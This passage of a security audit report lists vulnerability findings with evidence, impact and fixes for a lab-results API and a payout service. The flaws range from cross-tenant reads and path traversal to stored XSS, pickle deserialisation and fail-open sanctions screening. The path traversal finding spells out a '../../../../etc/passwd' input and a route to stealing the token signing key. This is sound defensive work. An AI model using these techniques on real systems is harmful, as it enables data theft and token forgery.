findings.evidence: The three read handlers on this controller are siblings of one resource family and only two of them scope. list_for_patient passes request.scope['user'] down and the query filters 'WHERE patient_id = $1 AND ordering_org = $2' (results.py:40, store.py:39). one loads the row and compares row['ordering_org'] != request.scope['user']['org_id'], raising NotFoundException otherwise (results.py:54-55). recent_for_panel takes no request parameter at all (results.py:42-49) and calls store.recent_by_panel(panel_code, order, limit), whose query filters on panel_code alone: 'WHERE panel_code = $1 ORDER BY resulted_at {order} LIMIT {limit}' (store.py:53-56). No organisation predicate exists on that path. The docstring is where the intent slipped - 'the last N runs of one assay across the site' (store.py:49) - because 'the site' turns out to be the whole database. The rows returned include id, patient_id, value_json and comment (store.py:52).
findings.impact: Any holder of any valid token reads other organisations' patient results - patient identifiers, the full result values and the clinician comment - for any panel code they can name, up to 500 rows per request (results.py:49) with no rate limit beyond the global 120/minute (app.py:27-30). Panel codes are assay identifiers shared across the whole reference network, so they need no guessing. In a laboratory system these rows are health data about identified people, which is the most sensitive category this tree holds. The guard that was supposed to be the backstop, require_patient_scope, is inert for an unrelated reason (F-LAB-01), and even if it were live it inspects the patient_id path parameter (guards.py:79), which this route does not have.
findings.recommendation: Add the organisation predicate to the query - 'WHERE panel_code = $1 AND ordering_org = $2' - and pass request.scope['user']['org_id'] from the handler, as list_for_patient already does one method above. If a cross-organisation view is genuinely wanted for the analyser dashboard, it needs its own scope and its own explicit check, not the absence of one.

triage.reason: No mandatory layer applies a tenant filter. asyncpg is used directly with hand-written SQL (store.py:51-58); there is no ORM, no row-level security in the tree and no session variable set on the connection. The one application-wide guard, require_patient_scope, never executes (F-LAB-01), and would not cover this route if it did.

The exposure is not intended and bounded. The two sibling handlers in the same class both enforce the organisation boundary, which is the design being contradicted, and the CORS configuration at app.py:16-20 shows the API is meant for two named first-party origins rather than as a public feed.

The returned columns include patient_id, value_json and comment (store.py:52) - identified clinical results, not reference data. The catalogue-style data in this system is client_scopes and RESULT_SORT_COLUMNS in settings.py, and this is not that.

scope.established_by: WEB-24's sibling procedure applied to one class: the three @get handlers on ResultsController were listed, and for each the organisation check was located or its absence recorded - results.py:40 via store.py:39, results.py:54 inline, and nothing for results.py:42. The store function each calls was then read to confirm at the query level.
scope.narrowed_by: Nothing narrows it. A valid bearer token is the only precondition, and no guard is attached to this handler - contrast the explicit guards=[require_write] at results.py:58 and :71 and guards=[require_admin] at :76.

findings.title: The report handler serves its cache before it checks the organisation, and the cache key is derived only from the result id
findings.class: Broken object-level authorization / cache keyed without the principal
findings.evidence: The handler's first action is the cache read, and it returns on a hit: 'cached = await render.cached_report(result_id); if cached is not None: return cached' (:23-25). The authorization check is three lines below, at :28: 'if row is None or row["ordering_org"] != request.scope["user"]["org_id"]: raise NotFoundException'. On a cache hit that comparison is never reached. The key contains nothing about the caller: _cache_key is 'report:' + sha256(result_id)[:32] (render.py:40-41), derived from the result id alone, and the cache is a shared Redis instance (store.py:25-29, settings.py:16). Entries live for report_cache_seconds, default 600 (settings.py:19, render.py:50). The population path is authorized - put_report at reports.py:32 runs only after the check at :28 passes - which is exactly what makes the defect quiet: the first requester is always legitimate.
findings.impact: Once any operator of the owning organisation views a report, the rendered HTML is served for the next ten minutes to any authenticated caller of any organisation who requests the same result id. The report body is the patient-facing clinical document: panel code, patient identifier, collected and resulted timestamps, every result value and the clinician's comment (render.py:11-20, :31-37). The check that exists is a correct check that a request can walk around.
findings.recommendation: Move the authorization above the cache read: load the row, compare ordering_org, and only then consult the cache. Additionally include the organisation in the cache key so a poisoned or stale entry cannot cross the boundary even if the ordering is later changed back.

triage.reason: The only other layer that runs is BearerAuth (guards.py:21-44), which establishes identity and not entitlement, and the application-level guard require_patient_scope, which is inert (F-LAB-01) and in any case tests a patient_id path parameter this route does not have.

The scope was checked rather than assumed to be wide: the cache covers exactly one handler, GET /api/v1/reports/{result_id}. That is narrow, and it is enough - that one handler renders the full clinical report, and there is no condition on the cache path that re-applies the organisation test.
The cached object is the rendered patient report containing identified results (render.py:11-20). Nothing in it is public or synthetic.

scope.established_by: grep -rn for cached_report and put_report gave the two call sites, both inside reports.report, and their line numbers relative to the organisation comparison at :28 establish the ordering. The key construction was read at render.py:40-41 and contains only the result id.
scope.narrowed_by: render.py:50 / settings.py:19 - an entry is only exploitable within report_cache_seconds of a legitimate view, 600 seconds by default. That bounds the window, not the boundary.

findings.title: Path traversal in the attachment route: the client-supplied path segment is joined to the attachment root with no containment check
findings.evidence: The handler declares {name:path} (:35), which is Litestar's greedy segment type and captures everything after /attachments/ including slashes. The target is built as Path(settings.attachment_root) / name.lstrip("/") (:37). lstrip('/') removes leading separators, which prevents an absolute path from replacing the base - and does nothing about '..'. There is no resolve(), no normalisation, no comparison of the resolved path against settings.attachment_root, and no allowlist of names. The file is then read wholesale and returned: target.read_bytes() at :41. Everything else in the handler treats the input as trusted, including the Content-Disposition filename at :43. attachment_root defaults to /srv/labtrack/attachments (settings.py:18).
findings.impact: Any authenticated caller reads any file the service process can open: '../../../../etc/passwd' walks out of the attachment root, and the more valuable targets are the service's own - a .env or systemd unit carrying LABTRACK_TOKEN_KEY, which is the HMAC key that signs every access token (tokens.py:33, guards.py:35). Reading that key turns a low-privilege token into the ability to mint any token, including role=lab_admin and any org_id, which collapses every other control in this service. The response is served with media_type application/pdf but the bytes are returned verbatim.
findings.recommendation: Resolve and contain: target = (Path(settings.attachment_root) / name).resolve(); then require target.is_relative_to(Path(settings.attachment_root).resolve()) before opening, and 404 otherwise. Better still, do not accept a path at all - store attachments under server-generated identifiers and look the identifier up in the database, which also gives the route the organisation check it currently lacks.

triage.reason: No layer normalises or contains the path. The route has no guard of its own (contrast results.py:58, :71, :76), the application-level guard is inert (F-LAB-01) and would not match this path anyway, and BearerAuth inspects only the Authorization header. Between the path parameter at :36 and read_bytes at :41 there are exactly two operations, lstrip and the join, and neither constrains traversal.
name is a path parameter typed str with no pattern, no length bound and no allowlist. The :path converter is chosen deliberately so that separators are accepted.

The sink is Path.read_bytes on an arbitrary filesystem path (:41), which reads whatever it is pointed at. The declared media_type at :42 changes what the browser does with the bytes, not what the server reads.

scope.established_by: The boundary enumeration listed nine Litestar handlers; this is the only one taking a :path parameter and the only one touching the filesystem. grep for Path( and read_bytes across the tree returns this handler alone.
scope.narrowed_by: The route requires a valid bearer token, since BearerAuth (app.py:22, :48) excludes only /health and /api/v1/oauth. That narrows the caller set to anyone the token endpoint will issue to; it does not narrow the file set at all, and the route applies no organisation check even for attachments that are legitimately inside the root.

findings.title: The clinician comment is sanitised on single create and not on bulk import, and the report template interpolates it unescaped
findings.evidence: render_report escapes every value it places into the template except one. title, collected, resulted and every cell built by _rows go through html.escape (render.py:23-26, :32-34); comment=result['comment'] at :36 does not, and it lands inside <section class="comment">{comment}</section> (:18) in a response served as media_type="text/html" (reports.py:21). The column has two writers and only one sanitises: create passes bleach.clean(data.comment, tags=ALLOWED_COMMENT_TAGS, strip=True) (results.py:65), while import_batch hands store.bulk_import the raw list of dicts (results.py:72-73) and bulk_import inserts row.get('comment', '') untouched (store.py:98). grep for bleach across the whole tree returns three hits: the import, the single call at results.py:65, and the dependency in pyproject.toml. The import path also takes data: list[dict] (results.py:72) with no dataclass and no schema, so no field on it is validated at all.
findings.impact: A caller with any write scope - clinic-desktop holds results:write (settings.py:26) - POSTs one batch to /api/v1/results/import with a comment containing markup, and that markup executes in the browser of every clinician who opens the corresponding report. The report page is same-origin with the portal (app.py:17), so script there can act as the viewing clinician against this API, reading results and, with an admin viewer, deleting them (results.py:76). It is also stored and long-lived: the rendered output is cached for ten minutes per view (render.py:50) and re-rendered from the same row thereafter.
findings.recommendation: Escape at render time - html.escape the comment at render.py:36 like its four neighbours - and if the light markup is genuinely wanted, apply bleach.clean at that point with the same ALLOWED_COMMENT_TAGS allowlist, so one code path decides for every writer. Independently, give import_batch a declared schema rather than list[dict], so the bulk path validates what the single path validates.

triage.reason: No sanitiser sits on the import path. The route's only guard is require_write (results.py:71), which is an entitlement check; bulk_import performs one dict lookup and inserts (store.py:98, :104-109). And no output-side control compensates: the template applies escape to four values and not to this one.

On the import path the value is row.get('comment', '') taken from a request body typed list[dict] (results.py:72) - unconstrained by construction. Note the finding does not depend on the create path, where bleach genuinely does constrain it.

The sink is an HTML document declared as such at the handler (media_type="text/html", reports.py:21) and served to a browser. The <section> context at render.py:18 is ordinary element content, where markup is parsed.

scope.established_by: The two writers of results.comment were listed by grepping the column name across the service (store.py:84 from the create path, store.py:98 from the import path) and joined against the sanitiser sites from grep -rn bleach. The output side was established by reading render_report's five interpolated values and classifying each as escaped or raw. writer_parity.py returned 0 flags on this tree, so this was found by reading.
scope.narrowed_by: results.py:71 - the unsanitised writer is behind guards=[require_write], so the attacker needs a token whose client is registered for results:write or reports:write (settings.py:22-29, guards.py:18). That narrows who can plant it, not who is affected.

findings.title: The token endpoint is excluded from rate limiting by an explicit exception, leaving password verification unthrottled
findings.evidence: RateLimitConfig applies 120 requests per minute but names two exclusions, '/health' and '/api/v1/oauth' (:27-30), and the comment above it records the reasoning: refresh storms after a network blip were tripping the limiter (:24-26). /api/v1/oauth is where TokenController lives (tokens.py:38) and its only route is POST /token (:41), the password grant. That handler looks the operator up by username and client_id and verifies an Argon2 hash (tokens.py:44-56) with no attempt counter, no lockout, no backoff and now no rate limit. Nothing else in the tree throttles it: grep for RateLimit returns the import and this configuration only.
findings.impact: Unlimited online password guessing against every registered operator account, from a single source, at whatever rate the Argon2 verification cost allows. A successful guess yields a token carrying org_id, role and care_links (tokens.py:58-66), and a role of lab_admin authorises result deletion (results.py:76, guards.py:90-93). The exclusion also removes the only backstop on the endpoint's CPU cost, since each attempt runs a deliberately expensive KDF - so the same exception invites resource exhaustion.
findings.recommendation: Rate limit the token endpoint on identity rather than removing the limit: throttle per username and per client_id with progressive backoff and a lockout, which does not penalise the refresh storms the comment describes because those carry valid credentials and can be given a separate, higher allowance. Keeping /health excluded is fine; the two do not need the same treatment.

triage.reason: There is no compensating throttle. tokens.py performs a single fetchrow and a hash verification with no counter; there is no failed-attempt column read or written, and no other middleware in the app's list (app.py:48) limits anything.

An edge proxy or WAF could throttle in front of this service, but no such artifact was provided and none is referenced anywhere in the tree. Per FP-08 that is UNKNOWN, never HOLDS, and per the contract this UNKNOWN is what caps the finding at probable rather than confirmed. The in-tree half is not in doubt: the application declares a rate limiter and then explicitly exempts its own authentication endpoint (app.py:27-30). What cannot be established here is whether anything in front of it compensates.
This is not an absent defence in depth behind a working control. Argon2 raises the cost per guess and is the right hash, but it is not an attempt limit, and no attempt limit exists anywhere else.

scope.established_by: The exclusion list at app.py:29 holds two literals. Each was resolved against the route enumeration: '/health' matches the handler at app.py:38, and '/api/v1/oauth' matches TokenController at tokens.py:38, whose single route is :41. That is the complete list of unthrottled endpoints.
scope.narrowed_by: app.py:27 - every other route in the service retains the 120-per-minute limit, so this is one endpoint rather than a global absence.

findings.title: Panel definitions are deserialised from Redis with pickle
findings.evidence: cached_panel_definition reads a blob from Redis and calls pickle.loads(blob) (:124-127); store_panel_definition writes pickle.dumps into the same key space (:131). The docstring at :119-123 gives the reason - Decimal reference ranges and a unit registry that JSON flattens badly - which is an honest engineering motive and does not change what pickle does: it reconstructs arbitrary objects and executes code during reconstruction. The Redis URL defaults to redis://localhost:6379/2 with no credentials and no TLS (settings.py:16), and the same instance is used for the report cache (render.py:45-50), so it is not a dedicated store. grep across the tree returns no caller for either function.
findings.impact: Anyone able to write the key panel:<code> in that Redis instance gets code execution inside the API process, which holds the database credentials and the token signing key. Redis is a common target for lateral movement precisely because it is so often reachable without authentication on an internal network, and the second writer into the same instance is the report cache, which stores attacker-influenced HTML (F-LAB-05) - though that path writes different keys.
findings.recommendation: Serialise as JSON with an explicit codec for Decimal, or use a schema library that round-trips the types you need. If pickle is retained, sign the blob with a server-held key and verify before deserialising, never after, and require authentication and TLS on the Redis connection.

triage.reason: Neither function has a caller anywhere in the tree - grep returns only the two declarations. That is not enough to answer HOLDS: unlike the private, single-file dead code in ruled_out, these are module-level public functions in a service package whose consumers may be outside what was provided. Per the contract this UNKNOWN caps the finding at probable, which is why it is not reported as confirmed, and it is the reason the severity is low rather than high.

The value comes from a network service, not from the process. FP-02 asks for the origin traced back to something outside an attacker's reach, and a shared Redis instance with a no-credential default (settings.py:16) is not that.

No integrity check precedes the deserialisation. The blob goes from cache().get straight into pickle.loads with only a None test between them (:124-127); there is no HMAC, no signature and no type allowlist.

scope.established_by: The sink enumeration found exactly one deserialisation call in the tree. grep -rn for cached_panel_definition and store_panel_definition returned no call sites, which is what bounds the finding and is stated in the triage rather than left out.
scope.narrowed_by: No caller exists in the audited tree, so the sink is not reachable through any route enumerated here. The finding is reported because the function is public API of a service module and the exculpation cannot be established.

findings.title: The adjustAmount signal mutates the payout amount after the approval threshold has been tested, so an approved payout can be debited for any amount
findings.evidence: amountMinor is a mutable local (:42) with a signal handler that overwrites it with no validation and no state test: wf.setHandler(adjustAmount, (minor) => { amountMinor = minor; }) at :54-56. The dual-approval decision reads that variable once, at :93, and then the workflow blocks for up to 72 hours waiting for signatures: await wf.condition(() => approvals.size >= 2, '72h') at :95. Any adjustAmount signal delivered during that wait rebinds amountMinor, and the value actually debited is read afterwards, at :103-109, where postEntry receives amountMinor. The same variable is then what is submitted to the rail (:120, :137). Temporal delivers signals to a running workflow at any point, which is the entire purpose of the endpoint at starter.ts:53-61, so the window is not theoretical - it is the documented operating procedure described at :52-53, 'Treasury trims a payout down to the funded amount from the ops console while it is still waiting'.
findings.impact: Two approvers sign off a payout at, say, USD 600, and the amount is then raised to any figure before the debit. The ledger is debited and the rail instructed for the new amount, with the approval record in the workflow history still showing the approvals that were given for the old one. The threshold table (lib/limits.ts:5-14) becomes advisory: submit any amount below the currency's threshold to skip approval entirely, then raise it after the check at :93 has already passed. Both directions defeat the same control.
findings.recommendation: Re-evaluate the threshold against the current amount immediately before postEntry, and require re-approval when the amount has risen since the approvals were collected. Better, make the adjustment a first-class transition: record the amount each approval was given for, and clear the approvals map whenever adjustAmount changes the value, so the condition at :95 has to be satisfied again.

triage.reason: No layer downstream re-checks the amount against the threshold. postEntry (ledger.ts:25-59) enforces the account floor and nothing about approvals; releaseHold (compliance.ts:70-81) writes a note and returns void; the rails (rails.ts:26, :55) submit what they are given. grep for approvalThresholdFor returns two hits, the declaration and the single read at payout.ts:92.

There is a second principal by construction: the approvers are distinct from the requester, enforced at :48, and the whole control exists to separate the person who asks from the people who agree. A requester who can move the amount after they have agreed has crossed that boundary.

The construct's scope was checked rather than assumed. The handler is registered unconditionally at :54 for the whole life of the workflow, and both consumers of amountMinor - the debit at :105 and the rail submissions at :120 and :137 - are downstream of the wait. There is no condition anywhere that freezes the value.

scope.established_by: Every read and write of amountMinor in the workflow was listed in order - declared :42, written :55, read :93, read :105, read :120, read :137 - and crossed against the one suspension point, the 72-hour await at :95. The applies_to list is every read that occurs after a write can intervene.
scope.narrowed_by: Nothing narrows it. The signal handler carries no state guard, and the endpoint that sends it (starter.ts:53-61) applies no condition either.

findings.title: The amount-adjustment endpoint validates nothing and authenticates no one, while the endpoint beside it parses a full schema
findings.evidence: The two POST handlers in this server are siblings and only one validates. /payouts parses its body with payoutRequestSchema (:42), a zod schema that bounds amountMinor to a positive integer no greater than 50_000_00 (:17) and constrains every other field (:8-22). /payouts/:id/amount takes the body with a bare cast - const body = (await readJson(req)) as { amountMinor: number } (:55) - and signals the value straight through at :57. A TypeScript cast performs no runtime check, so amountMinor may be negative, fractional, zero, a string or absent. Neither handler performs any authentication or authorization: there is no token check, no session and no allowlist anywhere in the server (:36-80), and the only mitigation is the loopback bind at :83 with the comment 'Reachable only from the ops console sidecar in the same pod'. The negative case is the sharp one, because postEntry's floor test is an arithmetic comparison: 'if (balance - entry.amountMinor < floor)' (ledger.ts:38) passes trivially for a negative amount, and the update at :42 then computes balance_minor - (negative), increasing the balance.
findings.impact: Anyone who can reach the port sends one unauthenticated request and sets any in-flight payout to any amount. A negative amount passes the funding floor check and credits the funding account while booking a debit-kind ledger entry (ledger.ts:46-50), so the ledger and the balance disagree in the attacker's favour. A very large amount, combined with F-PAY-01, moves money past dual approval. Because the workflow id is derived predictably from the payout id (starter.ts:45, :56), a caller who knows or guesses a payout id can target it directly.
findings.recommendation: Parse the body with a zod schema, reusing the same bound as the creation path - z.object({ amountMinor: z.number().int().positive().max(50_000_00) }) - and reject anything else. Authenticate both endpoints rather than relying on the network position; a loopback bind is a deployment assumption, not an authorization decision. Independently, make postEntry reject a non-positive amount explicitly, so the invariant is enforced where the money moves.

triage.reason: No layer validates behind it. The signal handler assigns without checking (payout.ts:55), and the only downstream numeric test is ledger.ts:38, which as shown passes for negative values rather than rejecting them. The rails serialise whatever they receive (rails.ts:33, :62).

The loopback bind at starter.ts:83 is the strongest form of this argument and it does not reach: the process shares its network namespace with the ops console sidecar named in the comment, so any other process or compromised container in that pod is a second principal, and the CORS wildcard of F-PAY-05 additionally lets a browser page reach the port. FP-06 requires the boundary named explicitly, and here naming it shows it is crossed.

The missing validation applies to one route, which is narrow, and that one route sets the amount of money that moves. Its sibling at :41 shows the same author validating thoroughly, so the asymmetry is between two handlers of one family rather than a uniform absence.

scope.established_by: The three routes on this server were enumerated (:41, :53, :63) and each was read for a validation call and for an authentication check. /payouts validates and does not authenticate; /payouts/:id/amount does neither; /accounts/:id/entries validates the page parameter (:67) and does not authenticate (reported as F-PAY-06).
scope.narrowed_by: starter.ts:83 - the listener binds to 127.0.0.1, so the caller must already be on the host or in the pod, or must reach it through a browser as described in F-PAY-05. That narrows who can send the request; it does not add any check to the request itself.

findings.title: Sanctions screening fails open three ways: the exception path clears the payout, the default mode never blocks, and the degraded flag is never read
findings.evidence: Three independent lines each disable the screening result, and together they mean no payout is ever stopped by it in the shipped configuration. First, the catch block manufactures a clean result: 'catch (err) { screening = { blocked: false, listHits: [], degraded: true } }' (:80-84). Any failure of the screening activity - including the explicit throw on an HTTP error at compliance.ts:32-34, after Temporal exhausts its three attempts - produces a not-blocked verdict. Second, blocked is computed as 'listHits.length > 0 && config.sanctionsMode === \'enforcing\'' (compliance.ts:40), and sanctionsMode defaults to 'advisory' (config.ts:20), so a confirmed list hit yields blocked: false unless an environment variable says otherwise. Third, degraded is set at payout.ts:83 and read nowhere: grep for degraded across the tree returns three hits, the interface field (compliance.ts:14), the false assignment (compliance.ts:42) and this write. Nothing branches on it, so the compensating narrative in the comment at :81-82 - that the batch shows up on the next morning's exception report - has no mechanism in this tree. The only consumer of screening is the test at :86.
findings.impact: A beneficiary on a blocking list is paid. In the default configuration that happens even when the screening service works perfectly and returns hits, because advisory mode discards them; and when the service is unavailable it happens regardless of mode, because the catch has already decided. This is the control the service exists to apply before moving money, and there is no path in the shipped default on which it stops anything. The exposure is regulatory as much as financial.
findings.recommendation: Fail closed: let the screening failure propagate and stop the payout, or route it to a manual hold, rather than synthesising a clean verdict. Default sanctionsMode to 'enforcing' and require an explicit opt-out, so the safe value is the one you get by saying nothing. Then give degraded a reader - at minimum, treat degraded === true as requiring the dual-approval branch before :103.

triage.reason: No later stage re-screens. After :86 the workflow calls corridorVolume, whose result is discarded (:90), then postEntry and the rails, none of which consult a list. grep for screenBeneficiary returns the proxy declaration and the single call at :79.

Screening is not defence in depth here; it is the primary compliance control on the money-movement path, and the pack is explicit that a failed control is reported as a failure rather than as hardening, precisely because the project already believes it holds it - the docstring at compliance.ts:17-20 states the intent in writing.

None of the three lines is behind a development flag. The catch block and the unread flag ship unconditionally, and the advisory default at config.ts:20 is the shipped default rather than a test value - it is the value in force whenever SANCTIONS_MODE is unset.

scope.established_by: The single consumer of the screening result was located (payout.ts:86) and each input to it traced backwards: the catch that can produce it, the boolean expression that computes it, and the configuration value that expression depends on. The unread degraded flag came from the WEB-23 reader sweep - grep for the symbol returning writers and no readers.
scope.narrowed_by: compliance.ts:40 - setting SANCTIONS_MODE=enforcing restores blocking for the case where the screening service answers successfully. It does not touch the catch at payout.ts:80-84, so even in enforcing mode an outage still clears every payout.

findings.title: The rail reference doubles as the callback secret and is generated with Math.random
findings.evidence: newReference builds its value from Math.random().toString(36).slice(2, 12) concatenated to Date.now().toString(36) (:22-23). Its own docstring states the security role: 'The rail quotes it back on its status callback, so it doubles as the callback secret' (:18-20). Neither component is unpredictable to an attacker - Date.now is public knowledge to the second, and Math.random is a non-cryptographic PRNG whose state is recoverable from consecutive outputs. The same value is also used as the rail's idempotency key (:30). node:crypto is available in this runtime and is not imported anywhere in this service.
findings.impact: An attacker who can post to the status callback endpoint can forge the settlement status of payouts whose reference they predict, marking failed transfers as accepted or the reverse. Because the reference is minted for every submission in sequence, observing a handful of references - they are printed on the remittance advice per the same docstring, so they are not confidential - is enough to recover the generator state and derive neighbours. The value additionally serves as the rail's idempotency key, so predicting it lets an attacker collide with a legitimate transfer's key at the rail.
findings.recommendation: Generate it from a CSPRNG: randomUUID() from node:crypto, or randomBytes(16).toString('base64url'), keeping the PO- prefix for human readability. Then stop using the reference as a shared secret at all - authenticate rail callbacks with a signature over the payload using a key held by both parties, so predicting an identifier proves nothing.

triage.reason: The value's security significance is asserted by the code's own documentation at rails.ts:18-20: it is what the rail quotes back to authenticate a status callback.

The callback receiver is not in this tree - grep finds no handler consuming a rail status callback - so whether it applies an additional signature check cannot be established here. Per the contract this UNKNOWN is what holds the finding at probable rather than confirmed. What would settle it is the callback handler, wherever it lives. The in-tree half is not in doubt: a non-cryptographic generator produces a value the code's own docstring calls a secret.
The rule concerns attacker-controlled input reaching a sink. This defect is the mirror image - a value that must be unguessable and is not - and is answered under FP-07.

scope.established_by: grep -rn 'Math.random' over the tree returned two sites; this is the payout one. grep for newReference returned its declaration and exactly two call sites, one in each rail submission function.
scope.narrowed_by: Nothing in this tree narrows it. Both rail paths use the same generator, and the value is transmitted to the rail on every submission.

findings.title: The payout API sets Access-Control-Allow-Origin from a config value that defaults to the wildcard, on an API with no authentication
findings.evidence: corsOrigin is declared as process.env.PAYOUT_CORS_ORIGIN ?? '*' (config.ts:25) and written onto every response before any routing happens: res.setHeader('access-control-allow-origin', config.corsOrigin) is the first statement of the request handler (starter.ts:37), above the try block and above all three routes. default_resolver.py flagged exactly this shape - 'TABLE payout-orchestrator/src/config.ts:25 config can resolve to corsOrigin: process.env.PAYOUT_CORS_ORIGIN ?? \'*\' - the call site names the key, not this' - and the point it makes is visible at starter.ts:37, where the reader shows a config key and nothing of the wildcard behind it. What makes this more than cosmetic is the company it keeps: none of the three routes performs any authentication (F-PAY-02, F-PAY-06), and the service listens on 127.0.0.1 (:83), which is reachable from a browser on the same machine.
findings.impact: Any web page a user visits can issue cross-origin requests to http://127.0.0.1:8410 and, because of the wildcard, read the responses. That means reading any funding account's ledger entries through GET /accounts/{id}/entries and confirming the effect of state-changing calls. The loopback bind that is presented as the security boundary at :82 does not exclude the user's own browser, and the wildcard converts requests a page could always send blindly into requests whose responses it can read.
findings.recommendation: Default corsOrigin to the ops console's exact origin and treat an unset variable as a startup failure rather than as the wildcard.
